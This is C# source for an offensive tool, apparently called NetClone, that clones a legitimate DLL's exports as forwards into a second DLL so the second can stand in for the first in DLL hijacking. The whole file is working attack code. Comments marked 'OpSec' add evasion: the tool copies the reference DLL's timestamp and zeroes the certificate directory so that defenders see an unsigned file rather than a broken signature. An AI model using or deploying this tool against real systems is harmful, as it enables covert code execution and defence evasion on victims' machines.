using System;
using PeNet;
using PeNet.Structures;
using System.Collections.Generic;
using System.Text;
using System.Linq;
using CommandLine;
using System.Reflection;
using PeNet.Utilities;

namespace NetClone
{
    class Program
    {
        // Read_Only | Initialized_Data
        const uint DEFAULT_CHARACTERISTICS = 0x40000040;
        const uint SECTION_NAME = 8;

        static uint AlignUp(uint value, uint align = 0x1000)
        {
            uint t1 = (value + align - 1) & ~(align - 1);
            return t1;
        }
        static uint GetOffset(AbstractStructure structure)
        {
            FieldInfo Offset = structure.GetType().GetField("Offset", BindingFlags.Instance | BindingFlags.NonPublic);
            return (uint)Offset.GetValue(structure);
        }

        static IMAGE_SECTION_HEADER AddSection(ref PeFile pe, string name, uint size, uint characteristics = DEFAULT_CHARACTERISTICS)
        {
            if (name.Length > SECTION_NAME)
            {
                throw new Exception("Section name is too long");
            }

            // sizeof(IMAGE_SECTION_HEADER);
            const uint headerSize = 0x28;
            uint headerOffset = GetOffset(pe.ImageSectionHeaders.Last()) + headerSize;
            if (headerOffset + headerSize > pe.ImageNtHeaders.OptionalHeader.SizeOfHeaders)
            {
                throw new Exception("Not enough room for additional SECTION_HEADER");
            }

            uint virtualSize = AlignUp(size, pe.ImageNtHeaders.OptionalHeader.SectionAlignment);
            uint virtualAddress = AlignUp(
                pe.ImageSectionHeaders.Last().VirtualAddress + pe.ImageSectionHeaders.Last().VirtualSize,
                pe.ImageNtHeaders.OptionalHeader.SectionAlignment
            );

            uint rawSize = AlignUp(size, pe.ImageNtHeaders.OptionalHeader.FileAlignment);
            uint rawPtr = AlignUp(
                pe.ImageSectionHeaders.Last().PointerToRawData + pe.ImageSectionHeaders.Last().SizeOfRawData,
                pe.ImageNtHeaders.OptionalHeader.FileAlignment
            );

            byte[] nullPadding = new byte[SECTION_NAME];

            IMAGE_SECTION_HEADER section = new IMAGE_SECTION_HEADER(
                pe.Buff, headerOffset, pe.ImageNtHeaders.OptionalHeader.ImageBase)
            {
                Name = Encoding.ASCII.GetBytes(name).Concat(nullPadding).ToArray(),
                VirtualAddress = virtualAddress,
                PointerToRawData = rawPtr,
                VirtualSize = virtualSize,
                SizeOfRawData = rawSize,
                Characteristics = characteristics,

                PointerToRelocations = 0,
                NumberOfRelocations = 0,
                NumberOfLinenumbers = 0,
                PointerToLinenumbers = 0,
            };

            pe.ImageNtHeaders.FileHeader.NumberOfSections += 1;
            pe.ImageNtHeaders.OptionalHeader.SizeOfImage = virtualAddress + virtualSize;

            byte[] resizedBuffer = pe.Buff;
            Array.Resize(ref resizedBuffer, pe.Buff.Length + (int)rawSize);
            pe = new PeFile(resizedBuffer);

            return section;
        }
        static void CloneExports(ref PeFile target, PeFile reference, string referencePath, string sectionName, bool verbose)
        {
            // Architecture guard: PE32 (0x10B) vs PE32+ (0x20B). Mismatch produces silent
            // corruption in the loader; catch it up front instead.
            if (target.ImageNtHeaders.OptionalHeader.Magic != reference.ImageNtHeaders.OptionalHeader.Magic)
            {
                throw new Exception(String.Format(
                    "Architecture mismatch: target magic 0x{0:X4}, reference magic 0x{1:X4}",
                    target.ImageNtHeaders.OptionalHeader.Magic,
                    reference.ImageNtHeaders.OptionalHeader.Magic));
            }

            // Forwards don't typically supply an extension
            referencePath = referencePath.Replace(".dll", "");

            IMAGE_DATA_DIRECTORY tgtExportDirectory = target.ImageNtHeaders.OptionalHeader.DataDirectory[0];
            IMAGE_DATA_DIRECTORY refExportDirectory = reference.ImageNtHeaders.OptionalHeader.DataDirectory[0];

            if (!reference.HasValidExportDir)
            {
                throw new Exception("Reference DLL has no export directory");
            }

            List<string> forwardNames = new List<string>();
            foreach (ExportFunction export in reference.ExportedFunctions.OrderBy(e => e.Ordinal))
            {
                if (export.HasName)
                {
                    forwardNames.Add(String.Format("{0}.{1}", referencePath, export.Name));
                }
                else
                {
                    forwardNames.Add(String.Format("{0}.#{1}", referencePath, export.Ordinal));
                }
            }

            byte[] nullByte = new byte[1];
            byte[] forwardNameBlock = forwardNames.SelectMany(
                s => Encoding.ASCII.GetBytes(s).Concat(nullByte)
            ).ToArray();

            // Add a new section to hold the new export table
            uint newSectionSize = (uint)refExportDirectory.Size + (uint)forwardNameBlock.Length;
            IMAGE_SECTION_HEADER newSection = AddSection(ref target, sectionName, newSectionSize);
            uint delta = newSection.VirtualAddress - refExportDirectory.VirtualAddress;
            uint forwardOffset = (uint)(newSection.VirtualAddress + refExportDirectory.Size);

            // Clear existing export table (optional)
            // Array.Clear(target.Buff, (int)GetOffset(target.ImageExportDirectory), (int)tgtExportDirectory.Size);

            // Write our new export table into the section
            Array.Copy(
                reference.Buff, GetOffset(reference.ImageExportDirectory),
                target.Buff, newSection.PointerToRawData,
                refExportDirectory.Size
            );

            // Add in our forward name block
            Array.Copy(
                forwardNameBlock, 0,
                target.Buff, newSection.PointerToRawData + refExportDirectory.Size,
                forwardNameBlock.Length
            );

            IMAGE_EXPORT_DIRECTORY newExportDir = new IMAGE_EXPORT_DIRECTORY(target.Buff, newSection.PointerToRawData);

            newExportDir.AddressOfFunctions += (uint)delta;
            newExportDir.AddressOfNames += (uint)delta;
            newExportDir.AddressOfNameOrdinals += (uint)delta;
            newExportDir.Name += (uint)delta;


            // Link function addresses to forward names
            if (verbose)
            {
                Console.WriteLine("[i] Cloned {0} entries:", forwardNames.Count);
            }
            uint rawAddressOfFunctions = newExportDir.AddressOfFunctions.RVAtoFileMapping(target.ImageSectionHeaders);
            int nameIdx = 0;
            for (int i = 0; i < newExportDir.NumberOfFunctions; i++)
            {
                uint offset = (uint)(rawAddressOfFunctions + 4 * i);
                if (target.Buff.BytesToUInt32(offset) == 0)
                    continue; // hollow slot (never used)

                string forwardName = forwardNames[nameIdx];
                target.Buff.SetUInt32(offset, forwardOffset);
                forwardOffset += (uint)forwardName.Length + 1;
                if (verbose)
                {
                    uint ordinal = newExportDir.Base + (uint)i;
                    Console.WriteLine("    ord={0,-5} -> {1}", ordinal, forwardName);
                }
                nameIdx++;
            }

            // Apply delta to export names
            uint rawAddressOfNames = newExportDir.AddressOfNames.RVAtoFileMapping(target.ImageSectionHeaders);
            for (int i = 0; i < newExportDir.NumberOfNames; i++)
            {
                uint offset = (uint)(rawAddressOfNames + 4 * i);
                target.Buff.SetUInt32(offset, target.Buff.BytesToUInt32(offset) + delta);
            }

            // Correct the image size
            target.ImageNtHeaders.OptionalHeader.DataDirectory[0].VirtualAddress = newSection.VirtualAddress;
            target.ImageNtHeaders.OptionalHeader.DataDirectory[0].Size = newSectionSize;

            // OpSec: match the reference's PE header timestamp so the cloned DLL looks like a twin.
            target.ImageNtHeaders.FileHeader.TimeDateStamp = reference.ImageNtHeaders.FileHeader.TimeDateStamp;

            // OpSec: our edits invalidate any Authenticode signature the target had. Zero the
            // Certificate DataDirectory (DataDirectory[4]) so the file reads as "unsigned"
            // rather than "signed but broken" (the latter is a defender signal on its own).
            // Note: the certificate bytes themselves live in the overlay past the last section,
            // which PeNet retains when saving. If you need the overlay stripped too, use
            // PyClone-lief which handles that via lief's Builder config.
            target.ImageNtHeaders.OptionalHeader.DataDirectory[4].VirtualAddress = 0;
            target.ImageNtHeaders.OptionalHeader.DataDirectory[4].Size = 0;

            return;
        }

        public class Options
        {
            [Option("target", Required = true, HelpText = "Target DLL for modifications")]
            public string Target { get; set; }
            [Option("reference", Required = true, HelpText = "Reference DLL from which the exports will be cloned")]
            public string Reference { get; set; }
            [Option('o', "output", Required = false, HelpText = "Output file path (Default = <target>.clone.dll)")]
            public string Output { get; set; }
            [Option('p', "reference-path", Required = false, HelpText = "Full path to reference DLL while being hijacked (if <reference> is not accurate)")]
            public string ReferencePath { get; set; }
            [Option('s', "section-path", Required = false, HelpText = "New section name", Default = ".rdata2")]
            public string SectionPath { get; set; }
            [Option('v', "verbose", Required = false, HelpText = "Print each cloned entry and its forward target")]
            public bool Verbose { get; set; }
        }

        static void Main(string[] args)
        {
            Parser.Default.ParseArguments<Options>(args)
           .WithParsed<Options>(o =>
           {
               if (String.IsNullOrEmpty(o.ReferencePath))
               {
                   o.ReferencePath = o.Reference;
               }

               if (String.IsNullOrEmpty(o.Output))
               {
                   o.Output = o.Target + ".clone.dll";
               }

               PeFile targetPe = new PeFile(o.Target);
               PeFile referencePe = new PeFile(o.Reference);

               CloneExports(ref targetPe, referencePe, o.ReferencePath, o.SectionPath, o.Verbose);

               targetPe.SaveAs(o.Output);

               Console.WriteLine("[+] Done.");
           });
        }
    }
}
